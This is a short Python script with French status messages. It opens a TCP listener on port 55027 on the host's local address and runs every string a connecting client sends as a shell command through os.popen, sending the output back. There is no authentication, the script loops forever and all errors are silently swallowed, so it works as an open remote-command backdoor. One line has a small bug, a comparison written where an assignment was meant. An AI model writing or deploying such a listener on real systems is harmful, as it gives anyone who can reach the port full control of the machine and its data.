import socket,sys,os,time
time.sleep(5)
try:
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    HOST=s.getsockname()[0]
    s.close()
except:
    HOST="192.168.56.1"
print(HOST)
PORT = 55027
S = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
    S.bind((HOST,PORT))
except socket.error:
    print("liaison echoué")
    sys.exit()
while True:
    try:
        print("seveur Prêt ,en attente de requette... ")
        S.listen(2)
        con,add=S.accept()
        print("Client connecté, adresse IP %s, port %s" % (add[0], add[1]))
        while True:
            msgClient = con.recv(1024).decode("Utf8")
            if msgClient.upper() == "FIN" or msgClient =="":
                break
            else:
                msg=os.popen(msgClient).read()
                if msg=="":
                    msg=="OK"
                con.send(msg.encode("Utf8"))
                time.sleep(5)
                msg="ex"
                con.send(msg.encode("Utf8"))
    except:
        pass
